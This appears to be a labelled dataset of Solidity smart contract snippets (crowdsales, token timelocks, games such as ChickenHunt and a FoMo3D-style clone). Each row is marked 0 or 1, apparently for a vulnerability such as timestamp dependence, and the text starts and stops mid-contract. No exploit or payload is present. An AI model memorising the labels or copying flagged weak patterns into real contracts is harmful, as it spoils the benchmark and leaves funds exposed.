public {    ethereumBalance[developer] = ethereumBalance[developer].add(devFee);    delete devFee;  }     modifier onlyCommittee {    require(msg.sender == committee);    _;  }} 
0<CODESPLIT>contract ChickenHunt is CHCommittee {     event Join(address user);     constructor() public {    committee = msg.sender;    developer = msg.sender;  }     function init(address _chickenTokenDelegator) external onlyCommittee {    require(chickenTokenDelegator == address(0));    chickenTokenDelegator = _chickenTokenDelegator;    genesis = 1525791600;    join();    store.owner = msg.sender;    store.cost = 0.1 ether;    setConfiguration(100, 0.00001 ether, 99, 100000, 0.001 ether, 9);    setDistribution(20, 75, 1, 4);    setCooldownTime(600);    setDepot(0.05 ether, 9);    addItem(5, 5, 0, 0.01 ether);    addItem(0, 0, 5, 0.01 ether);    addPet(1000, 0, 0, 100000, 0.01 ether, 9);    addPet(0, 1000, 0, 100000, 0.01 ether, 9);    addPet(0, 0, 1000, 202500, 0.01 ether, 9);  }  function withdraw() external {    uint256 _ethereum = ethereumBalance[msg.sender];    delete ethereumBalance[msg.sender];    msg.sender.transfer(_ethereum);  }  function join() public {    House storage _house = houses[msg.sender];    require(_house.depots == 0);    _house.hunter = Hunter(1, 1, 1, 1);    _house.depots = 1;    _house.huntingPower = 10;    _house.offensePower = 10;    _house.defensePower = 110;    _house.huntingMultiplier = 10;    _house.offenseMultiplier = 10;    _house.defenseMultiplier = 10;    lastSaveTime[msg.sender] = block.timestamp;    emit Join(msg.sender);  }  function hunterOf(address _user)    public    view    returns (      uint256 _strength,      uint256 _dexterity,      uint256 _constitution,      uint256 _resistance    )  {    Hunter memory _hunter = houses[_user].hunter;    return (      _hunter.strength,      _hunter.dexterity,      _hunter.constitution,      _hunter.resistance    );  }  function detailsOf(address _user)    public    view    returns (      uint256[2] _hunting,      uint256[2] _offense,      uint256[2] _defense,      uint256[4] _hunter,      uint256[] _pets,      uint256 _depots,      uint256 _savedChicken,      uint256 _lastSaveTime,      uint256 _cooldown    )  {    House memory _house = houses[_user];    _hunting = [_house.huntingPower, _house.huntingMultiplier];    _offense = [_house.offensePower, _house.offenseMultiplier];    _defense = [_house.defensePower, _house.defenseMultiplier];    _hunter = [      _house.hunter.strength,      _house.hunter.dexterity,      _house.hunter.constitution,      _house.hunter.resistance    ];    _pets = _house.pets;    _depots = _house.depots;    _savedChicken = savedChickenOf[_user];    _lastSaveTime = lastSaveTime[_user];    _cooldown = attackCooldown[_user];  }}
0<CODESPLIT>contract MintableToken is StandardToken, Ownable {  event Mint(address indexed to, uint256 amount);  event MintFinished();  bool public mintingFinished = false;  modifier canMint() {    require(!mintingFinished);    _;  }     function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {    totalSupply_ = totalSupply_.add(_amount);    balances[_to] = balances[_to].add(_amount);    emit Mint(_to, _amount);    emit Transfer(address(0), _to, _amount);    return true;  }     function finishMinting() onlyOwner canMint public returns (bool) {    mintingFinished = true;    emit MintFinished();    return true;  }} 
0<CODESPLIT>contract JcnxxxToken is MintableToken {	string public name = "JCN Token";	string public symbol = "JCNXXX";	uint8 public decimals = 18;}  
0<CODESPLIT>contract Crowdsale {  using SafeMath for uint256;     ERC20 public token;     address public wallet;     uint256 public rate;     uint256 public weiRaised;     event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);     function Crowdsale(uint256 _rate, address _wallet, ERC20 _token) public {    require(_rate > 0);    require(_wallet != address(0));    require(_token != address(0));    rate = _rate;    wallet = _wallet;    token = _token;  }              function () external payable {    buyTokens(msg.sender);  }     function buyTokens(address _beneficiary) public payable {    uint256 weiAmount = msg.value;    _preValidatePurchase(_beneficiary, weiAmount);         uint256 tokens = _getTokenAmount(weiAmount);         weiRaised = weiRaised.add(weiAmount);    _processPurchase(_beneficiary, tokens);    emit TokenPurchase(      msg.sender,      _beneficiary,      weiAmount,      tokens    );    _updatePurchasingState(_beneficiary, weiAmount);    _forwardFunds();    _postValidatePurchase(_beneficiary, weiAmount);  }              function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {    require(_beneficiary != address(0));    require(_weiAmount != 0);  }     function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {       }     function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {    token.transfer(_beneficiary, _tokenAmount);  }     function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {    _deliverTokens(_beneficiary, _tokenAmount);  }     function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {       }     function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {    return _weiAmount.mul(rate);  }     function _forwardFunds() internal {    wallet.transfer(msg.value);  }}  
1<CODESPLIT>contract TimedCrowdsale is Crowdsale {  using SafeMath for uint256;  uint256 public openingTime;  uint256 public closingTime;     modifier onlyWhileOpen {         require(block.timestamp >= openingTime && block.timestamp <= closingTime);    _;  }     function TimedCrowdsale(uint256 _openingTime, uint256 _closingTime) public {         require(_openingTime >= block.timestamp);    require(_closingTime >= _openingTime);    openingTime = _openingTime;    closingTime = _closingTime;  }     function hasClosed() public view returns (bool) {         return block.timestamp > closingTime;  }     function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal onlyWhileOpen {    super._preValidatePurchase(_beneficiary, _weiAmount);  }}  
0<CODESPLIT>contract FinalizableCrowdsale is TimedCrowdsale, Ownable {  using SafeMath for uint256;  bool public isFinalized = false;  event Finalized();     function finalize() onlyOwner public {    require(!isFinalized);    require(hasClosed());    finalization();    emit Finalized();    isFinalized = true;  }     function finalization() internal {  }}  
0<CODESPLIT>contract MintedCrowdsale is Crowdsale {     function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {    require(MintableToken(token).mint(_beneficiary, _tokenAmount));  }}  
0<CODESPLIT>contract CappedCrowdsale is Crowdsale {  using SafeMath for uint256;  uint256 public cap;     function CappedCrowdsale(uint256 _cap) public {    require(_cap > 0);    cap = _cap;  }     function capReached() public view returns (bool) {    return weiRaised >= cap;  }     function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {    super._preValidatePurchase(_beneficiary, _weiAmount);    require(weiRaised.add(_weiAmount) <= cap);  }} 
1<CODESPLIT>contract JcnxxxCrowdsale is FinalizableCrowdsale, MintedCrowdsale, CappedCrowdsale {	uint256 public constant FOUNDERS_SHARE = 30000000 * (10 ** uint256(18));	 	uint256 public constant RESERVE_FUND = 15000000 * (10 ** uint256(18));		 	uint256 public constant CONTENT_FUND = 5000000 * (10 ** uint256(18));		 	uint256 public constant BOUNTY_FUND = 5000000 * (10 ** uint256(18));		 	uint256 public constant HARD_CAP = 100000000 * (10 ** uint256(18));			 	 	enum IcoPhases { PrivateSale, EarlyBirdPresale, Presale, EarlyBirdCrowdsale, FullCrowdsale }	struct Phase {		uint256 startTime;		uint256 endTime;		uint256 minimum;	 		uint8 bonus;	}	mapping (uint => Phase) ico;	 	function JcnxxxCrowdsale(uint256 _openingTime, uint256 _closingTime, uint256 _rate, address _wallet, MintableToken _token) public	CappedCrowdsale(HARD_CAP.div(_rate))	FinalizableCrowdsale()	MintedCrowdsale()	TimedCrowdsale(_openingTime, _closingTime)	Crowdsale(_rate, _wallet, _token) 	{       		 		 		ico[uint(IcoPhases.PrivateSale)] = Phase(1531126800, 1537001999, 10000000000000000000, 50);			 		ico[uint(IcoPhases.EarlyBirdPresale)] = Phase(1537002000, 1537865999, 750000000000000000, 25);					 		ico[uint(IcoPhases.Presale)] = Phase(1537866000, 1538729999, 500000000000000000, 15);				 		ico[uint(IcoPhases.EarlyBirdCrowdsale)] = Phase(1538730000, 1539593999, 250000000000000000, 5);				 		ico[uint(IcoPhases.FullCrowdsale)] = Phase(1539594000, 1542275999, 1000000000000000, 2);	}	 	function mintReservedTokens() onlyOwner public {		 		uint256 reserved_tokens = FOUNDERS_SHARE.add(RESERVE_FUND).add(CONTENT_FUND).add(BOUNTY_FUND);		require(MintableToken(token).mint(wallet, reserved_tokens));	}	 	function airdrop(address[] _to, uint256[] _value) onlyOwner public returns (bool) {		 		 		require(!isFinalized);		require(_to.length == _value.length);        require(_to.length <= 100);                 for(uint8 i = 0; i < _to.length; i++) {            require(MintableToken(token).mint(_to[i], (_value[i].mul((10 ** uint256(18))))) == true);        }        return true;	}	 	 	 	 	function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {		super._preValidatePurchase(_beneficiary, _weiAmount);		 		uint256 minimum = _currentIcoPhaseMinimum();		 		require(_weiAmount >= minimum);	}	 	function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {		uint256 tokens = _weiAmount.mul(rate);		 		uint bonus = _currentIcoPhaseBonus();		 		return tokens.add((tokens.mul(bonus)).div(100));	}	 	function finalization() internal {		uint256 _tokenAmount = HARD_CAP.sub(token.totalSupply());		require(MintableToken(token).mint(wallet, _tokenAmount));		super.finalization();	}	 	 	 	 	function _currentIcoPhaseBonus() public view returns (uint8) {		for (uint i = 0; i < 5; i++) {			if(ico[i].startTime <= now && ico[i].endTime >= now){				return ico[i].bonus;			}		}		return 0;	 	}	 	function _currentIcoPhaseMinimum() public view returns (uint256) {		for (uint i = 0; i < 5; i++) {			if(ico[i].startTime <= now && ico[i].endTime >= now){				return ico[i].minimum;			}		}		return 0;	 	}}
0<CODESPLIT>contract Outer {    Inner1 public myInner1 = new Inner1();        function callSomeFunctionViaOuter() public {        myInner1.callSomeFunctionViaInner1();    }}
0<CODESPLIT>contract Inner1 {    Inner2 public myInner2 = new Inner2();        function callSomeFunctionViaInner1() public {        myInner2.doSomething();    }}
0<CODESPLIT>contract Inner2 {    uint256 someValue;    event SetValue(uint256 val);        function doSomething() public {        someValue = block.timestamp;        emit SetValue(someValue);    }}
1<CODESPLIT>contract IcoRocketFuel is Ownable {    using SafeMath for uint256;         enum States {Active, Refunding, Closed}    struct Crowdsale {        address owner;                 address refundWallet;          uint256 cap;                   uint256 goal;                  uint256 raised;                uint256 rate;                  uint256 minInvest;             uint256 closingTime;           bool earlyClosure;             uint8 commission;              States state;              }         address public commissionWallet;                  mapping(address => Crowdsale) public crowdsales;                   mapping (address => mapping(address => uint256)) public deposits;    modifier onlyCrowdsaleOwner(address _token) {        require(            msg.sender == crowdsales[_token].owner,            "Failed to call function due to permission denied."        );        _;    }    modifier inState(address _token, States _state) {        require(            crowdsales[_token].state == _state,            "Failed to call function due to crowdsale is not in right state."        );        _;    }    modifier nonZeroAddress(address _token) {        require(            _token != address(0),            "Failed to call function due to address is 0x0."        );        _;    }    event CommissionWalletUpdated(        address indexed _previoudWallet,          address indexed _newWallet            );    event CrowdsaleCreated(        address indexed _owner,          address indexed _token,          address _refundWallet,           uint256 _cap,                    uint256 _goal,                   uint256 _rate,                   uint256 closingTime,             bool earlyClosure,               uint8 _commission            );    event TokenBought(        address indexed _buyer,          address indexed _token,          uint256 _value               );    event CrowdsaleClosed(        address indexed _setter,          address indexed _token        );    event SurplusTokensRefunded(        address _token,                address _beneficiary,          uint256 _surplus           );    event CommissionPaid(        address indexed _payer,                address indexed _token,                address indexed _beneficiary,          uint256 _value                     );    event RefundsEnabled(        address indexed _setter,          address indexed _token        );    event CrowdsaleTokensRefunded(        address indexed _token,                 address indexed _refundWallet,          uint256 _value                      );    event RaisedWeiClaimed(        address indexed _beneficiary,          address indexed _token,                uint256 _value                     );    event TokenClaimed(        address indexed _beneficiary,          address indexed _token,                uint256 _value                     );    event CrowdsalePaused(        address indexed _owner,          address indexed _token       );    event WeiRefunded(        address indexed _beneficiary,          address indexed _token,                uint256 _value                     );                   function setCommissionWallet(        address _newWallet    )        external        onlyOwner        nonZeroAddress(_newWallet)    {        emit CommissionWalletUpdated(commissionWallet, _newWallet);        commissionWallet = _newWallet;    }         function createCrowdsale(        address _token,        address _refundWallet,        uint256 _cap,        uint256 _goal,        uint256 _rate,        uint256 _minInvest,        uint256 _closingTime,        bool _earlyClosure,        uint8 _commission    )        external        nonZeroAddress(_token)        nonZeroAddress(_refundWallet)    {        require(            crowdsales[_token].owner == address(0),            "Failed to create crowdsale due to the crowdsale is existed."        );        require(            _goal <= _cap,            "Failed to create crowdsale due to goal is larger than cap."        );        require(            _minInvest > 0,            "Failed to create crowdsale due to minimum investment is 0."        );        require(            _commission <= 100,            "Failed to create crowdsale due to commission is larger than 100."        );                 _cap.mul(_rate);        crowdsales[_token] = Crowdsale({            owner: msg.sender,            refundWallet: _refundWallet,            cap: _cap,            goal: _goal,            raised: 0,            rate: _rate,            minInvest: _minInvest,            closingTime: _closingTime,            earlyClosure: _earlyClosure,            state: States.Active,            commission: _commission        });        emit CrowdsaleCreated(            msg.sender,             _token,            _refundWallet,            _cap,             _goal,             _rate,            _closingTime,            _earlyClosure,            _commission        );    }         function buyToken(        address _token    )        external        inState(_token, States.Active)        nonZeroAddress(_token)        payable    {        require(            msg.value >= crowdsales[_token].minInvest,            "Failed to buy token due to less than minimum investment."        );        require(            crowdsales[_token].raised.add(msg.value) <= (                crowdsales[_token].cap            ),            "Failed to buy token due to exceed cap."        );        require(                         block.timestamp < crowdsales[_token].closingTime,            "Failed to buy token due to crowdsale is closed."        );        deposits[msg.sender][_token] = (            deposits[msg.sender][_token].add(msg.value)        );        crowdsales[_token].raised = crowdsales[_token].raised.add(msg.value);        emit TokenBought(msg.sender, _token, msg.value);            }         function _goalReached(        ERC20 _token    )        private        nonZeroAddress(_token)        view        returns(bool)     {        return (crowdsales[_token].raised >= crowdsales[_token].goal) && (            _token.balanceOf(address(this)) >=             crowdsales[_token].raised.mul(crowdsales[_token].rate)        );    }         function _refundSurplusTokens(        ERC20 _token,        address _beneficiary    )        private        nonZeroAddress(_token)        inState(_token, States.Closed)    {        uint256 _balance = _token.balanceOf(address(this));        uint256 _surplus = _balance.sub(            crowdsales[_token].raised.mul(crowdsales[_token].rate));        emit SurplusTokensRefunded(_token, _beneficiary, _surplus);        if (_surplus > 0) {                         _token.transfer(_beneficiary, _surplus);        }    }         function _payCommission(        address _token    )        private        nonZeroAddress(_token)        inState(_token, States.Closed)        onlyCrowdsaleOwner(_token)    {                 uint256 _commission = crowdsales[_token].raised            .mul(uint256(crowdsales[_token].commission))            .div(100);        crowdsales[_token].raised = crowdsales[_token].raised.sub(_commission);        emit CommissionPaid(msg.sender, _token, commissionWallet, _commission);        commissionWallet.transfer(_commission);    }         function _refundCrowdsaleTokens(        ERC20 _token,        address _beneficiary    )        private        nonZeroAddress(_token)        inState(_token, States.Refunding)    {                                            crowdsales[_token].raised = 0;        uint256 _value = _token.balanceOf(address(this));        emit CrowdsaleTokensRefunded(_token, _beneficiary, _value);        if (_value > 0) {                                  _token.transfer(_beneficiary, _token.balanceOf(address(this)));        }    }         function _enableRefunds(        address _token    )        private        nonZeroAddress(_token)        inState(_token, States.Active)          {                 crowdsales[_token].state = States.Refunding;        emit RefundsEnabled(msg.sender, _token);    }         function finalize(        address _token    )        external        nonZeroAddress(_token)        inState(_token, States.Active)                onlyCrowdsaleOwner(_token)    {        require(                                crowdsales[_token].earlyClosure || (                         block.timestamp >= crowdsales[_token].closingTime),                               "Failed to finalize due to crowdsale is opening."        );        if (_goalReached(ERC20(_token))) {                         crowdsales[_token].state = States.Closed;            emit CrowdsaleClosed(msg.sender, _token);            _refundSurplusTokens(                ERC20(_token),                 crowdsales[_token].refundWallet            );            _payCommission(_token);                                } else {            _enableRefunds(_token);            _refundCrowdsaleTokens(                ERC20(_token),                 crowdsales[_token].refundWallet            );        }    }         function pauseCrowdsale(        address _token    )          external              nonZeroAddress(_token)        onlyOwner        inState(_token, States.Active)    {        emit CrowdsalePaused(msg.sender, _token);        _enableRefunds(_token);        _refundCrowdsaleTokens(ERC20(_token), crowdsales[_token].refundWallet);    }         function claimRaisedWei(        address _token,        address _beneficiary    )        external        nonZeroAddress(_token)        nonZeroAddress(_beneficiary)        inState(_token, States.Closed)        onlyCrowdsaleOwner(_token)            {        require(            crowdsales[_token].raised > 0,            "Failed to claim raised Wei due to raised Wei is 0."        );        uint256 _raisedWei = crowdsales[_token].raised;        crowdsales[_token].raised = 0;        emit RaisedWeiClaimed(msg.sender, _token, _raisedWei);        _beneficiary.transfer(_raisedWei);    }         function claimToken(        address _token    )        external         nonZeroAddress(_token)        inState(_token, States.Closed)    {        require(            deposits[msg.sender][_token] > 0,            "Failed to claim token due to deposit is 0."        );                 uint256 _value = (            deposits[msg.sender][_token].mul(crowdsales[_token].rate)        );        deposits[msg.sender][_token] = 0;        emit TokenClaimed(msg.sender, _token, _value);        ERC20(_token).transfer(msg.sender, _value);    }         function claimRefund(        address _token    )        public        nonZeroAddress(_token)        inState(_token, States.Refunding)    {        require(            deposits[msg.sender][_token] > 0,            "Failed to claim refund due to deposit is 0."        );        uint256 _value = deposits[msg.sender][_token];        deposits[msg.sender][_token] = 0;        emit WeiRefunded(msg.sender, _token, _value);        msg.sender.transfer(_value);    }}
1<CODESPLIT>contract ShareXTokenVault {    mapping(address => uint256) public timeLocks;    mapping(address => uint256) public claimed;    function canCollect() public view returns(bool) {        return block.timestamp > timeLocks[msg.sender] && claimed[msg.sender] == 0;    }}
1<CODESPLIT>contract TokenTimelock {  using SafeERC20 for ERC20Basic;     ERC20Basic public token;     address public beneficiary;     uint256 public releaseTime;  constructor(    ERC20Basic _token,    address _beneficiary,    uint256 _releaseTime  )    public  {         require(_releaseTime > block.timestamp);    token = _token;    beneficiary = _beneficiary;    releaseTime = _releaseTime;  }     function release() public {         require(block.timestamp >= releaseTime);    uint256 amount = token.balanceOf(this);    require(amount > 0);    token.safeTransfer(beneficiary, amount);  }} 
0<CODESPLIT>contract TstTokenTimelock is Ownable, TokenTimelock {  constructor(    ERC20Basic _token,    address _beneficiary,    uint256 _releaseTime  )    public    TokenTimelock(_token, _beneficiary, _releaseTime)  {}    function() public payable {    }    function withdrawEth(uint256 _value) public onlyOwner {        owner.transfer(_value);    }    function transferAnyERC20Token(address _token_address, uint _amount) public onlyOwner returns (bool success) {        require(_token_address != address(token));        return ERC20Basic(_token_address).transfer(owner, _amount);    }}
1<CODESPLIT>contract KingOfTheHill {	uint public timeLimit = 1 hours;	uint public lastKing;	function () external payable {		require(msg.value == 0.1 ether);		if ((lastKing + timeLimit) < block.timestamp) {		    lastKing = 100;		}	}}
1<CODESPLIT>contract hodlEthereum {    mapping (address => uint) hodlers;    uint constant partyTime = 1596067200;    function party() {        require (block.timestamp > partyTime && hodlers[msg.sender] > 0);        uint value = hodlers[msg.sender];        hodlers[msg.sender] = 0;        msg.sender.transfer(value);        return;    }}
0<CODESPLIT>contract holdEthereum {    mapping (address => uint) holders;    uint constant partyTime = 1596067200;    function party() {        if (block.timestamp < partyTime) throw;        uint value = holders[msg.sender];        holders[msg.sender] = 0;        msg.sender.transfer(value);        return;    }}
0<CODESPLIT>contract F3Devents {         event onNewName    (        uint256 indexed playerID,        address indexed playerAddress,        bytes32 indexed playerName,        bool isNewPlayer,        uint256 affiliateID,        address affiliateAddress,        bytes32 affiliateName,        uint256 amountPaid,        uint256 timeStamp    );         event onEndTx    (        uint256 compressedData,        uint256 compressedIDs,        bytes32 playerName,        address playerAddress,        uint256 ethIn,        uint256 keysBought,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount,        uint256 potAmount,        uint256 airDropPot    );	     event onWithdraw    (        uint256 indexed playerID,        address playerAddress,        bytes32 playerName,        uint256 ethOut,        uint256 timeStamp    );         event onWithdrawAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 ethOut,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount    );              event onBuyAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 ethIn,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount    );              event onReLoadAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount    );         event onAffiliatePayout    (        uint256 indexed affiliateID,        address affiliateAddress,        bytes32 affiliateName,        uint256 indexed roundID,        uint256 indexed buyerID,        uint256 amount,        uint256 timeStamp    );         event onPotSwapDeposit    (        uint256 roundID,        uint256 amountAddedToPot    );         event onEndRound    (        uint256 roundID,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot    );}    
0<CODESPLIT>contract modularShort is F3Devents {}
1<CODESPLIT>contract Duang8 is modularShort {    using SafeMath for *;    using NameFilter for string;    using F3DKeysCalcShort for uint256;    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0xE840E25BaB3F1F02eb1244a3aDC8965F5864f22E);        address private admin = msg.sender;    address private shareCom = 0x2F0839f736197117796967452310F025a330DA45;    address private groupCut = 0x2924C3BfA7A20eB7AEcB6c38F4576eDcf7a72Df3;    string constant public name = "duang8";    string constant public symbol = "duang8";    uint256 private rndExtra_ = 0;          uint256 private rndGap_ = 2 minutes;              uint256 constant private rndInit_ = 24 hours;                     uint256 constant private rndInc_ = 30 seconds;                   uint256 constant private rndMax_ = 24 hours;                     uint256 constant private rndLimit_ = 5000;                         uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;              constructor()        public    {		                                     		                               fees_[0] = F3Ddatasets.TeamFee(23,0);            fees_[1] = F3Ddatasets.TeamFee(33,0);            fees_[2] = F3Ddatasets.TeamFee(53,0);            fees_[3] = F3Ddatasets.TeamFee(43,0);                              potSplit_[0] = F3Ddatasets.PotSplit(42,0);           potSplit_[1] = F3Ddatasets.PotSplit(34,0);           potSplit_[2] = F3Ddatasets.PotSplit(18,0);           potSplit_[3] = F3Ddatasets.PotSplit(26,0);   	}             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");        _;    }         modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;        assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;    }             function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }    function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affCode, _team, _eventData_);    }    function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }    function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }    function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }    function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                 uint256 _now = now;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _eth;        uint256 _withdrawFee;                 if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         F3Ddatasets.EventReturns memory _eventData_;             			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);			             _eth = withdrawEarnings(_pID);                         if (_eth > 0)            {                                 _withdrawFee = _eth / 10;                uint256 _p1 = _withdrawFee / 2;                uint256 _p2 = _withdrawFee / 2;                shareCom.transfer(_p1);                admin.transfer(_p2);                plyr_[_pID].addr.transfer(_eth.sub(_withdrawFee));            }                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eth,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );                 } else {                         _eth = withdrawEarnings(_pID);                         if (_eth > 0)            {                                 _withdrawFee = _eth / 10;                _p1 = _withdrawFee / 2;                _p2 = _withdrawFee / 2;                shareCom.transfer(_p1);                admin.transfer(_p2);                plyr_[_pID].addr.transfer(_eth.sub(_withdrawFee));            }                         emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }    function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else               return ( 100000000000000 );      }         function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;        if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( ( round_[_rID].end).sub(_now) 